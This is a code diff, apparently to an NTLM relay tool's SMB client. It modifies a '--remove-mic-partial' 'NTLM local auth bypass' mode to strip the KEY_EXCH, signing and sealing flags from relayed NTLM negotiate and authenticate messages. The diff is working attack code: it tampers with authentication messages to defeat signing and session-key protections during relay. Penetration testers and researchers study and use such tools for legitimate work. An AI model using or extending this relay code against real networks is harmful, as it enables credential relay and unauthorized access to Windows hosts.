@@ -332,13 +332,18 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # Remove signing and sealing flags, keep KEY_EXCH and VERSION
+            # Remove signing, sealing, and KEY_EXCH flags
+            # KEY_EXCH removal is critical - tells server NOT to expect session key exchange
+            # This avoids signing/encryption issues when we have no valid session key
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+                LOG.debug('[SMB] sendNegotiate: Removed KEY_EXCH flag to avoid session key requirements')
 
         LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
@@ -626,13 +631,18 @@ class SMBRelayClient(ProtocolClient):
             original_flags = authMessage['flags']
             LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
 
+            # Remove SIGN, ALWAYS_SIGN, SEAL, and KEY_EXCH
+            # KEY_EXCH removal is critical - avoids session key signing/encryption issues
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
-            # Do NOT remove KEY_EXCH or VERSION flags
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+                LOG.debug('[SMB] sendAuth: Removed KEY_EXCH flag')
+            # Do NOT remove VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
 
             LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact' % authMessage['flags'])
